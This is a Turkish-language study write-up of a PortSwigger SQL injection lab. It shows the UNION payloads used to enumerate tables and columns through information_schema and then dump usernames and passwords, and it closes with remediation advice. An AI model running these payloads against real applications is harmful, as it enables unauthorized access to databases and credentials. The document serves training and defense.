# SQLi Lab #7: Examining the DB — yapıyı kazıma (information_schema, non-Oracle) — 26.10.2026

> Bir önceki lab'lar tablo/sütun adlarını veriyordu; bu lab vermiyor. Veritabanının kendi "katalog" tablolarından (information_schema) yapıyı kendin çıkarıyorsun — gerçek dünyaya bir adım daha yakın.

**Lab:** PortSwigger → SQL injection → Examining the database → *Listing the database contents on non-Oracle databases* (Practitioner)
**Görev:** DB yapısını keşfet, users tablosundan administrator'ın şifresini çek, administrator olarak giriş yap.

## information_schema nedir
Veritabanı kendini tarif eden meta tablolar tutar (kütüphanenin ana katalog defteri):
- `information_schema.tables` → tüm tabloların listesi (sütun: `table_name`).
- `information_schema.columns` → sütunların listesi (sütunlar: `table_name`, `column_name`).
Not: bu non-Oracle (PostgreSQL/MySQL/MSSQL) için geçerli; Oracle olsaydı `all_tables` / `all_tab_columns` kullanılırdı → dünkü fingerprinting dersi doğrudan burada belirleyici.

## Çözüm (iki aşamalı kazı)
Enjeksiyon noktası: `?category=` filtresi. UNION ile **2 sütun** ve metin taşıdıkları tespit edildi.

**Aşama 1 — tabloları listele:**
```
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
Gelen listede users'a benzeyen, ucu rastgele tablo bulundu: `users_xxxxxx` (yanında `user_mappings` gibi sistem tabloları gürültüydü).

**Aşama 2 — o tablonun sütunlarını listele:**
```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xxxxxx'--
```
Sütunlar bulundu: `username_xxxxxx`, `password_xxxxxx` (ve `email`).

**Aşama 3 — gerçek veriyi çek (dünkü refleks):**
```
' UNION SELECT username_xxxxxx, password_xxxxxx FROM users_xxxxxx--
```
Tüm kullanıcı/şifre çiftleri döküldü → administrator'ın şifresiyle giriş → **Solved.** ✅

## Dikkat edilen incelikler (precision)
- **`SELECT *` UNION'da çalışmaz:** `*` tablonun tüm sütunlarını getirir, UNION'ın istediği sütun SAYISI tutmaz (Kural 1). Bu, dünkü Oracle "tablo yok → `dual`" sorunundan FARKLI bir hata — ikisini karıştırma: biri sütun sayısı, öteki tablosuz select.
- **Tablo vs sütun adı:** tablo `information_schema.tables` (çoğul), sütun `table_name` (tekil). Benzer şekilde `column_name` da tekil. Bir harf hata = sonuç yok.

## 🛡️ Nasıl kapatılır (remediation)
- Asıl çözüm yine **parameterized queries** — girdi SQL yapısına karışamazsa information_schema'ya hiç ulaşılamaz.
- **Least privilege:** uygulamanın DB kullanıcısının `information_schema` / katalog view'larına ve ilgisiz tablolara erişimi kısıtlanabilir (okuyamazsa kazıyamaz).
- **Generic error + hassas veriyi hash'leme:** yapı sızsa bile şifreler hash'liyse (bcrypt/Argon2) doğrudan kullanılamaz (defense-in-depth).

## Zincir bağı
- UNION iskeleti (sütun sayısı → metin sütunu → veri) + dünkü fingerprinting (DBMS'e göre katalog farkı) burada birleşti.
- Gerçek dünya refleksi: isim verilmez, `information_schema`'dan kazarsın. Oracle'da aynı mantık farklı tablolarla (`all_tables`).
